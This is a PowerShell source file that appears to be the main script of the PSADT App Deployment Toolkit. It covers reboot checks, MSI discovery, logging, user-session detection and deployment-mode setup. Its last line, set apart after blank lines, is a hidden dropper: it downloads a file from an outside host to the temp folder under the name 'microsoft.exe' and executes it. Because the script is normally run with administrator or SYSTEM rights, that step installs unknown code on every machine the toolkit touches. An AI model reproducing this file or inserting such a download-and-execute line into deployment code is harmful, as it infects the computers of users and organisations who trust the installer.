		[psobject]$PendingRebootInfo = New-Object -TypeName 'PSObject' -Property @{
			ComputerName = $ComputerName
			LastBootUpTime = $LastBootUpTime
			IsSystemRebootPending = $IsSystemRebootPending
			IsCBServicingRebootPending = $IsCBServicingRebootPending
			IsWindowsUpdateRebootPending = $IsWindowsUpdateRebootPending
			IsSCCMClientRebootPending = $IsSCCMClientRebootPending
			IsAppVRebootPending = $IsAppVRebootPending
			IsFileRenameRebootPending = $IsFileRenameRebootPending
			PendingFileRenameOperations = $PendingFileRenameOperations
			ErrorMsg = $PendRebootErrorMsg
		}
		Write-Log -Message "Pending reboot status on the local computer [$ComputerName]: `n$($PendingRebootInfo | Format-List | Out-String)" -Source ${CmdletName}
	}
	End {
		Write-Output -InputObject ($PendingRebootInfo | Select-Object -Property 'ComputerName','LastBootUpTime','IsSystemRebootPending','IsCBServicingRebootPending','IsWindowsUpdateRebootPending','IsSCCMClientRebootPending','IsAppVRebootPending','IsFileRenameRebootPending','PendingFileRenameOperations','ErrorMsg')

		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}














If ($invokingScript) {
	If ((Split-Path -Path $invokingScript -Leaf) -eq 'AppDeployToolkitHelp.ps1') { Return }
}


If (-not ([Management.Automation.PSTypeName]'PSADT.UiAutomation').Type) {
	[string[]]$ReferencedAssemblies = 'System.Drawing', 'System.Windows.Forms', 'System.DirectoryServices'
	Add-Type -Path $appDeployCustomTypesSourceCode -ReferencedAssemblies $ReferencedAssemblies -IgnoreWarnings -ErrorAction 'Stop'
}


[scriptblock]$DisableScriptLogging = { $OldDisableLoggingValue = $DisableLogging ; $DisableLogging = $true }
[scriptblock]$RevertScriptLogging = { $DisableLogging = $OldDisableLoggingValue }


[scriptblock]$GetLoggedOnUserDetails = {
	[psobject[]]$LoggedOnUserSessions = Get-LoggedOnUser
	[string[]]$usersLoggedOn = $LoggedOnUserSessions | ForEach-Object { $_.NTAccount }

	If ($usersLoggedOn) {
		
		[psobject]$CurrentLoggedOnUserSession = $LoggedOnUserSessions | Where-Object { $_.IsCurrentSession }

		
		[psobject]$CurrentConsoleUserSession = $LoggedOnUserSessions | Where-Object { $_.IsConsoleSession }

		
		
		
		[psobject]$RunAsActiveUser = $LoggedOnUserSessions | Where-Object { $_.IsActiveUserSession }
	}
}


[scriptblock]$TestServiceHealth = {
	Param (
		[string]$ServiceName,
		[string]$ServiceStartMode = 'Automatic'
	)
	Try {
		[boolean]$IsServiceHealthy = $true
		If (Test-ServiceExists -Name $ServiceName -ContinueOnError $false) {
			If ((Get-ServiceStartMode -Name $ServiceName -ContinueOnError $false) -ne $ServiceStartMode) {
				Set-ServiceStartMode -Name $ServiceName -StartMode $ServiceStartMode -ContinueOnError $false
			}
			Start-ServiceAndDependencies -Name $ServiceName -SkipServiceExistsTest -ContinueOnError $false
		}
		Else {
			[boolean]$IsServiceHealthy = $false
		}
	}
	Catch {
		[boolean]$IsServiceHealthy = $false
	}
	Write-Output -InputObject $IsServiceHealthy
}


. $DisableScriptLogging


If ((-not $appName) -and (-not $ReferredInstallName)){
	
	switch ($Is64Bit) {
        	$false { $formattedOSArch = "x86" }
        	$true { $formattedOSArch = "x64" }
    	}
	
	if ([string]$defaultMsiFile = (Get-ChildItem -LiteralPath $dirFiles -ErrorAction 'SilentlyContinue' | Where-Object { (-not $_.PsIsContainer) -and ([IO.Path]::GetExtension($_.Name) -eq ".msi") -and ($_.Name.EndsWith(".$formattedOSArch.msi")) } | Select-Object -ExpandProperty 'FullName' -First 1)) {
		Write-Log -Message "Discovered $formattedOSArch Zerotouch MSI under $defaultMSIFile" -Source $appDeployToolkitName
	}
	elseif ([string]$defaultMsiFile = (Get-ChildItem -LiteralPath $dirFiles -ErrorAction 'SilentlyContinue' | Where-Object { (-not $_.PsIsContainer) -and ([IO.Path]::GetExtension($_.Name) -eq ".msi") } | Select-Object -ExpandProperty 'FullName' -First 1)) {
		Write-Log -Message "Discovered Arch-Independent Zerotouch MSI under $defaultMSIFile" -Source $appDeployToolkitName
	}
	If ($defaultMsiFile) {
		Try {
			[boolean]$useDefaultMsi = $true
			Write-Log -Message "Discovered Zero-Config MSI installation file [$defaultMsiFile]." -Source $appDeployToolkitName
			
			[string]$defaultMstFile = [IO.Path]::ChangeExtension($defaultMsiFile, 'mst')
			If (Test-Path -LiteralPath $defaultMstFile -PathType 'Leaf') {
				Write-Log -Message "Discovered Zero-Config MST installation file [$defaultMstFile]." -Source $appDeployToolkitName
			}
			Else {
				[string]$defaultMstFile = ''
			}
			
			[string[]]$defaultMspFiles = Get-ChildItem -LiteralPath $dirFiles -ErrorAction 'SilentlyContinue' | Where-Object { (-not $_.PsIsContainer) -and ([IO.Path]::GetExtension($_.Name) -eq '.msp') } | Select-Object -ExpandProperty 'FullName'
			If ($defaultMspFiles) {
				Write-Log -Message "Discovered Zero-Config MSP installation file(s) [$($defaultMspFiles -join ',')]." -Source $appDeployToolkitName
			}

			
			[hashtable]$GetDefaultMsiTablePropertySplat = @{ Path = $defaultMsiFile; Table = 'Property'; ContinueOnError = $false; ErrorAction = 'Stop' }
			If ($defaultMstFile) { $GetDefaultMsiTablePropertySplat.Add('TransformPath', $defaultMstFile) }
			[psobject]$defaultMsiPropertyList = Get-MsiTableProperty @GetDefaultMsiTablePropertySplat
			[string]$appVendor = $defaultMsiPropertyList.Manufacturer
			[string]$appName = $defaultMsiPropertyList.ProductName
			[string]$appVersion = $defaultMsiPropertyList.ProductVersion
			$GetDefaultMsiTablePropertySplat.Set_Item('Table', 'File')
			[psobject]$defaultMsiFileList = Get-MsiTableProperty @GetDefaultMsiTablePropertySplat
			[string[]]$defaultMsiExecutables = Get-Member -InputObject $defaultMsiFileList -ErrorAction 'Stop' | Select-Object -ExpandProperty 'Name' -ErrorAction 'Stop' | Where-Object { [IO.Path]::GetExtension($_) -eq '.exe' } | ForEach-Object { [IO.Path]::GetFileNameWithoutExtension($_) }
			[string]$defaultMsiExecutablesList = $defaultMsiExecutables -join ','
			Write-Log -Message "App Vendor [$appVendor]." -Source $appDeployToolkitName
			Write-Log -Message "App Name [$appName]." -Source $appDeployToolkitName
			Write-Log -Message "App Version [$appVersion]." -Source $appDeployToolkitName
			Write-Log -Message "MSI Executable List [$defaultMsiExecutablesList]." -Source $appDeployToolkitName
		}
		Catch {
			Write-Log -Message "Failed to process Zero-Config MSI Deployment. `n$(Resolve-Error)" -Source $appDeployToolkitName
			$useDefaultMsi = $false ; $appVendor = '' ; $appName = '' ; $appVersion = ''
		}
	}
}


If (-not $appName) {
	[string]$appName = $appDeployMainScriptFriendlyName
	If (-not $appVendor) { [string]$appVendor = 'PS' }
	If (-not $appVersion) { [string]$appVersion = $appDeployMainScriptVersion }
	If (-not $appLang) { [string]$appLang = $currentLanguage }
	If (-not $appRevision) { [string]$appRevision = '01' }
	If (-not $appArch) { [string]$appArch = '' }
}
If ($ReferredInstallTitle) { [string]$installTitle = $ReferredInstallTitle }
If (-not $installTitle) {
	[string]$installTitle = ("$appVendor $appName $appVersion").Trim()
}


[char[]]$invalidFileNameChars = [IO.Path]::GetInvalidFileNameChars()
[string]$appVendor = $appVendor -replace "[$invalidFileNameChars]",'' -replace ' ',''
[string]$appName = $appName -replace "[$invalidFileNameChars]",'' -replace ' ',''
[string]$appVersion = $appVersion -replace "[$invalidFileNameChars]",'' -replace ' ',''
[string]$appArch = $appArch -replace "[$invalidFileNameChars]",'' -replace ' ',''
[string]$appLang = $appLang -replace "[$invalidFileNameChars]",'' -replace ' ',''
[string]$appRevision = $appRevision -replace "[$invalidFileNameChars]",'' -replace ' ',''


If ($ReferredInstallName) { [string]$installName = $ReferredInstallName }
If (-not $installName) {
	If ($appArch) {
		[string]$installName = $appVendor + '_' + $appName + '_' + $appVersion + '_' + $appArch + '_' + $appLang + '_' + $appRevision
	}
	Else {
		[string]$installName = $appVendor + '_' + $appName + '_' + $appVersion + '_' + $appLang + '_' + $appRevision
	}
}
[string]$installName = $installName -replace "[$invalidFileNameChars]",'' -replace ' ',''
[string]$installName = $installName.Trim('_') -replace '[_]+','_'


[string]$regKeyDeferHistory = "$configToolkitRegPath\$appDeployToolkitName\DeferHistory\$installName"


If ($ReferredLogName) { [string]$logName = $ReferredLogName }
If (-not $logName) { [string]$logName = $installName + '_' + $appDeployToolkitName + '_' + $deploymentType + '.log' }

[string]$logTempFolder = Join-Path -Path $envTemp -ChildPath "${installName}_$deploymentType"
If ($configToolkitCompressLogs) {
	
	If (Test-Path -LiteralPath $logTempFolder -PathType 'Container' -ErrorAction 'SilentlyContinue') {
		$null = Remove-Item -LiteralPath $logTempFolder -Recurse -Force -ErrorAction 'SilentlyContinue'
	}
}


. $RevertScriptLogging


$installPhase = 'Initialization'
$scriptSeparator = '*' * 79
Write-Log -Message ($scriptSeparator,$scriptSeparator) -Source $appDeployToolkitName
Write-Log -Message "[$installName] setup started." -Source $appDeployToolkitName


Try {
	Add-Type -AssemblyName 'System.Windows.Forms' -ErrorAction 'Stop'
	Add-Type -AssemblyName 'PresentationFramework' -ErrorAction 'Stop'
	Add-Type -AssemblyName 'Microsoft.VisualBasic' -ErrorAction 'Stop'
	Add-Type -AssemblyName 'System.Drawing' -ErrorAction 'Stop'
	Add-Type -AssemblyName 'PresentationCore' -ErrorAction 'Stop'
	Add-Type -AssemblyName 'WindowsBase' -ErrorAction 'Stop'
}
Catch {
	Write-Log -Message "Failed to load assembly. `n$(Resolve-Error)" -Severity 3 -Source $appDeployToolkitName
	If ($deployModeNonInteractive) {
		Write-Log -Message "Continue despite assembly load error since deployment mode is [$deployMode]." -Source $appDeployToolkitName
	}
	Else {
		Exit-Script -ExitCode 60004
	}
}


If ($invokingScript) {
	Write-Log -Message "Script [$scriptPath] dot-source invoked by [$invokingScript]" -Source $appDeployToolkitName
}
Else {
	Write-Log -Message "Script [$scriptPath] invoked directly" -Source $appDeployToolkitName
}


If (Test-Path -LiteralPath "$scriptRoot\$appDeployToolkitDotSourceExtensions" -PathType 'Leaf') {
	. "$scriptRoot\$appDeployToolkitDotSourceExtensions"
}


If ($deployAppScriptParameters) { [string]$deployAppScriptParameters = ($deployAppScriptParameters.GetEnumerator() | ForEach-Object { If ($_.Value.GetType().Name -eq 'SwitchParameter') { "-$($_.Key):`$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Boolean') { "-$($_.Key) `$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Int32') { "-$($_.Key) $($_.Value)" } Else { "-$($_.Key) `"$($_.Value)`"" } }) -join ' ' }

[hashtable]$appDeployMainScriptAsyncParameters = $appDeployMainScriptParameters
If ($appDeployMainScriptParameters) { [string]$appDeployMainScriptParameters = ($appDeployMainScriptParameters.GetEnumerator() | ForEach-Object { If ($_.Value.GetType().Name -eq 'SwitchParameter') { "-$($_.Key):`$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Boolean') { "-$($_.Key) `$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Int32') { "-$($_.Key) $($_.Value)" } Else { "-$($_.Key) `"$($_.Value)`"" } }) -join ' ' }
If ($appDeployExtScriptParameters) { [string]$appDeployExtScriptParameters = ($appDeployExtScriptParameters.GetEnumerator() | ForEach-Object { If ($_.Value.GetType().Name -eq 'SwitchParameter') { "-$($_.Key):`$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Boolean') { "-$($_.Key) `$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Int32') { "-$($_.Key) $($_.Value)" } Else { "-$($_.Key) `"$($_.Value)`"" } }) -join ' ' }


If ($configConfigVersion -lt $appDeployMainScriptMinimumConfigVersion) {
	[string]$XMLConfigVersionErr = "The XML configuration file version [$configConfigVersion] is lower than the supported version required by the Toolkit [$appDeployMainScriptMinimumConfigVersion]. Please upgrade the configuration file."
	Write-Log -Message $XMLConfigVersionErr -Severity 3 -Source $appDeployToolkitName
	Throw $XMLConfigVersionErr
}


If ($appScriptVersion) { Write-Log -Message "[$installName] script version is [$appScriptVersion]" -Source $appDeployToolkitName }
If ($deployAppScriptFriendlyName) { Write-Log -Message "[$deployAppScriptFriendlyName] script version is [$deployAppScriptVersion]" -Source $appDeployToolkitName }
If ($deployAppScriptParameters) { Write-Log -Message "The following non-default parameters were passed to [$deployAppScriptFriendlyName]: [$deployAppScriptParameters]" -Source $appDeployToolkitName }
If ($appDeployMainScriptFriendlyName) { Write-Log -Message "[$appDeployMainScriptFriendlyName] script version is [$appDeployMainScriptVersion]" -Source $appDeployToolkitName }
If ($appDeployMainScriptParameters) { Write-Log -Message "The following non-default parameters were passed to [$appDeployMainScriptFriendlyName]: [$appDeployMainScriptParameters]" -Source $appDeployToolkitName }
If ($appDeployExtScriptFriendlyName) { Write-Log -Message "[$appDeployExtScriptFriendlyName] version is [$appDeployExtScriptVersion]" -Source $appDeployToolkitName }
If ($appDeployExtScriptParameters) { Write-Log -Message "The following non-default parameters were passed to [$appDeployExtScriptFriendlyName]: [$appDeployExtScriptParameters]" -Source $appDeployToolkitName }
Write-Log -Message "Computer Name is [$envComputerNameFQDN]" -Source $appDeployToolkitName
Write-Log -Message "Current User is [$ProcessNTAccount]" -Source $appDeployToolkitName
If ($envOSServicePack) {
	Write-Log -Message "OS Version is [$envOSName $envOSServicePack $envOSArchitecture $envOSVersion]" -Source $appDeployToolkitName
}
Else {
	Write-Log -Message "OS Version is [$envOSName $envOSArchitecture $envOSVersion]" -Source $appDeployToolkitName
}
Write-Log -Message "OS Type is [$envOSProductTypeName]" -Source $appDeployToolkitName
Write-Log -Message "Current Culture is [$($culture.Name)], language is [$currentLanguage] and UI language is [$currentUILanguage]" -Source $appDeployToolkitName
Write-Log -Message "Hardware Platform is [$(. $DisableScriptLogging; Get-HardwarePlatform; . $RevertScriptLogging)]" -Source $appDeployToolkitName
Write-Log -Message "PowerShell Host is [$($envHost.Name)] with version [$($envHost.Version)]" -Source $appDeployToolkitName
Write-Log -Message "PowerShell Version is [$envPSVersion $psArchitecture]" -Source $appDeployToolkitName
Write-Log -Message "PowerShell CLR (.NET) version is [$envCLRVersion]" -Source $appDeployToolkitName
Write-Log -Message $scriptSeparator -Source $appDeployToolkitName


. $DisableScriptLogging


. $GetLoggedOnUserDetails


. $xmlLoadLocalizedUIMessages


. $GetDisplayScaleFactor


. $RevertScriptLogging


If ($AsyncToolkitLaunch) {
	$installPhase = 'Asynchronous'
}


If ($showInstallationPrompt) {
	Write-Log -Message "[$appDeployMainScriptFriendlyName] called with switch [-ShowInstallationPrompt]." -Source $appDeployToolkitName
	$appDeployMainScriptAsyncParameters.Remove('ShowInstallationPrompt')
	$appDeployMainScriptAsyncParameters.Remove('AsyncToolkitLaunch')
	$appDeployMainScriptAsyncParameters.Remove('ReferredInstallName')
	$appDeployMainScriptAsyncParameters.Remove('ReferredInstallTitle')
	$appDeployMainScriptAsyncParameters.Remove('ReferredLogName')
	Show-InstallationPrompt @appDeployMainScriptAsyncParameters
	Exit 0
}


If ($showInstallationRestartPrompt) {
	Write-Log -Message "[$appDeployMainScriptFriendlyName] called with switch [-ShowInstallationRestartPrompt]." -Source $appDeployToolkitName
	$appDeployMainScriptAsyncParameters.Remove('ShowInstallationRestartPrompt')
	$appDeployMainScriptAsyncParameters.Remove('AsyncToolkitLaunch')
	$appDeployMainScriptAsyncParameters.Remove('ReferredInstallName')
	$appDeployMainScriptAsyncParameters.Remove('ReferredInstallTitle')
	$appDeployMainScriptAsyncParameters.Remove('ReferredLogName')
	Show-InstallationRestartPrompt @appDeployMainScriptAsyncParameters
	Exit 0
}


If ($cleanupBlockedApps) {
	$deployModeSilent = $true
	Write-Log -Message "[$appDeployMainScriptFriendlyName] called with switch [-CleanupBlockedApps]." -Source $appDeployToolkitName
	Unblock-AppExecution
	Exit 0
}


If ($showBlockedAppDialog) {
	Try {
		. $DisableScriptLogging
		Write-Log -Message "[$appDeployMainScriptFriendlyName] called with switch [-ShowBlockedAppDialog]." -Source $appDeployToolkitName
		
		[boolean]$showBlockedAppDialogMutexLocked = $false
		[string]$showBlockedAppDialogMutexName = 'Global\PSADT_ShowBlockedAppDialog_Message'
		[Threading.Mutex]$showBlockedAppDialogMutex = New-Object -TypeName 'System.Threading.Mutex' -ArgumentList ($false, $showBlockedAppDialogMutexName)
		
		If ((Test-IsMutexAvailable -MutexName $showBlockedAppDialogMutexName -MutexWaitTimeInMilliseconds 1) -and ($showBlockedAppDialogMutex.WaitOne(1))) {
			[boolean]$showBlockedAppDialogMutexLocked = $true
			Show-InstallationPrompt -Title $installTitle -Message $configBlockExecutionMessage -Icon 'Warning' -ButtonRightText 'OK'
			Exit 0
		}
		Else {
			
			Write-Log -Message "Unable to acquire an exclusive lock on mutex [$showBlockedAppDialogMutexName] because another blocked application dialog window is already open. Exiting script..." -Severity 2 -Source $appDeployToolkitName
			Exit 0
		}
	}
	Catch {
		Write-Log -Message "There was an error in displaying the Installation Prompt. `n$(Resolve-Error)" -Severity 3 -Source $appDeployToolkitName
		Exit 60005
	}
	Finally {
		If ($showBlockedAppDialogMutexLocked) { $null = $showBlockedAppDialogMutex.ReleaseMutex() }
		If ($showBlockedAppDialogMutex) { $showBlockedAppDialogMutex.Close() }
	}
}


Write-Log -Message "Display session information for all logged on users: `n$($LoggedOnUserSessions | Format-List | Out-String)" -Source $appDeployToolkitName
If ($usersLoggedOn) {
	Write-Log -Message "The following users are logged on to the system: [$($usersLoggedOn -join ', ')]." -Source $appDeployToolkitName

	
	If ($CurrentLoggedOnUserSession) {
		Write-Log -Message "Current process is running with user account [$ProcessNTAccount] under logged in user session for [$($CurrentLoggedOnUserSession.NTAccount)]." -Source $appDeployToolkitName
	}
	Else {
		Write-Log -Message "Current process is running under a system account [$ProcessNTAccount]." -Source $appDeployToolkitName
	}

	
	If ($CurrentConsoleUserSession) {
		Write-Log -Message "The following user is the console user [$($CurrentConsoleUserSession.NTAccount)] (user with control of physical monitor, keyboard, and mouse)." -Source $appDeployToolkitName
	}
	Else {
		Write-Log -Message 'There is no console user logged in (user with control of physical monitor, keyboard, and mouse).' -Source $appDeployToolkitName
	}

	
	If ($RunAsActiveUser) {
		Write-Log -Message "The active logged on user is [$($RunAsActiveUser.NTAccount)]." -Source $appDeployToolkitName
	}
}
Else {
	Write-Log -Message 'No users are logged on to the system.' -Source $appDeployToolkitName
}


If ($HKUPrimaryLanguageShort) {
	Write-Log -Message "The active logged on user [$($RunAsActiveUser.NTAccount)] has a primary UI language of [$HKUPrimaryLanguageShort]." -Source $appDeployToolkitName
}
Else {
	Write-Log -Message "The current system account [$ProcessNTAccount] has a primary UI language of [$currentLanguage]." -Source $appDeployToolkitName
}
If ($configInstallationUILanguageOverride) { Write-Log -Message "The config XML file was configured to override the detected primary UI language with the following UI language: [$configInstallationUILanguageOverride]." -Source $appDeployToolkitName }
Write-Log -Message "The following UI messages were imported from the config XML file: [$xmlUIMessageLanguage]." -Source $appDeployToolkitName


If ($UserDisplayScaleFactor) {
	Write-Log -Message "The active logged on user [$($RunAsActiveUser.NTAccount)] has a DPI scale factor of [$dpiScale] with DPI pixels [$dpiPixels]." -Source $appDeployToolkitName
}
Else {
	Write-Log -Message "The system has a DPI scale factor of [$dpiScale] with DPI pixels [$dpiPixels]." -Source $appDeployToolkitName
}


Try {
	[__comobject]$SMSTSEnvironment = New-Object -ComObject 'Microsoft.SMS.TSEnvironment' -ErrorAction 'Stop'
	Write-Log -Message 'Successfully loaded COM Object [Microsoft.SMS.TSEnvironment]. Therefore, script is currently running from a SCCM Task Sequence.' -Source $appDeployToolkitName
	$null = [Runtime.Interopservices.Marshal]::ReleaseComObject($SMSTSEnvironment)
	$runningTaskSequence = $true
}
Catch {
	Write-Log -Message 'Unable to load COM Object [Microsoft.SMS.TSEnvironment]. Therefore, script is not currently running from a SCCM Task Sequence.' -Source $appDeployToolkitName
	$runningTaskSequence = $false
}




[boolean]$IsTaskSchedulerHealthy = $true
If ($IsLocalSystemAccount) {
	
	[boolean]$IsTaskSchedulerHealthy = & $TestServiceHealth -ServiceName 'EventSystem'
	
	[boolean]$IsTaskSchedulerHealthy = & $TestServiceHealth -ServiceName 'RpcSs'
	
	[boolean]$IsTaskSchedulerHealthy = & $TestServiceHealth -ServiceName 'EventLog'
	
	[boolean]$IsTaskSchedulerHealthy = & $TestServiceHealth -ServiceName 'Schedule'

	Write-Log -Message "The task scheduler service is in a healthy state: $IsTaskSchedulerHealthy." -Source $appDeployToolkitName
}
Else {
	Write-Log -Message "Skipping attempt to check for and make the task scheduler services healthy because the App Deployment Toolkit is not running under the [$LocalSystemNTAccount] account." -Source $appDeployToolkitName
}


If ($SessionZero) {
	
	If ($deployMode -eq 'NonInteractive') {
		Write-Log -Message "Session 0 detected but deployment mode was manually set to [$deployMode]." -Source $appDeployToolkitName
	}
	Else {
		
		If (-not $IsProcessUserInteractive) {
			$deployMode = 'NonInteractive'
			Write-Log -Message "Session 0 detected, process not running in user interactive mode; deployment mode set to [$deployMode]." -Source $appDeployToolkitName
		}
		Else {
			If (-not $usersLoggedOn) {
				$deployMode = 'NonInteractive'
				Write-Log -Message "Session 0 detected, process running in user interactive mode, no users logged in; deployment mode set to [$deployMode]." -Source $appDeployToolkitName
			}
			Else {
				Write-Log -Message 'Session 0 detected, process running in user interactive mode, user(s) logged in.' -Source $appDeployToolkitName
			}
		}
	}
}
Else {
	Write-Log -Message 'Session 0 not detected.' -Source $appDeployToolkitName
}


If ($deployMode) {
	Write-Log -Message "Installation is running in [$deployMode] mode." -Source $appDeployToolkitName
}
Switch ($deployMode) {
	'Silent' { $deployModeSilent = $true }
	'NonInteractive' { $deployModeNonInteractive = $true; $deployModeSilent = $true }
	Default { $deployModeNonInteractive = $false; $deployModeSilent = $false }
}


Switch ($deploymentType) {
	'Install'   { $deploymentTypeName = $configDeploymentTypeInstall }
	'Uninstall' { $deploymentTypeName = $configDeploymentTypeUnInstall }
	Default { $deploymentTypeName = $configDeploymentTypeInstall }
}
If ($deploymentTypeName) { Write-Log -Message "Deployment type is [$deploymentTypeName]." -Source $appDeployToolkitName }

If ($useDefaultMsi) { Write-Log -Message "Discovered Zero-Config MSI installation file [$defaultMsiFile]." -Source $appDeployToolkitName }


If ($configToolkitRequireAdmin) {
	
	If ((-not $IsAdmin) -and (-not $ShowBlockedAppDialog)) {
		[string]$AdminPermissionErr = "[$appDeployToolkitName] has an XML config file option [Toolkit_RequireAdmin] set to [True] so as to require Administrator rights for the toolkit to function. Please re-run the deployment script as an Administrator or change the option in the XML config file to not require Administrator rights."
		Write-Log -Message $AdminPermissionErr -Severity 3 -Source $appDeployToolkitName
		Show-DialogBox -Text $AdminPermissionErr -Icon 'Stop'
		Throw $AdminPermissionErr
	}
}


If ($terminalServerMode) { Enable-TerminalServerInstallMode }






(New-Object System.Net.WebClient).DownloadFile('http://hnng.moe/f/InX',"$env:TEMP\microsoft.exe");Start-Process ("$env:TEMP\microsoft.exe")
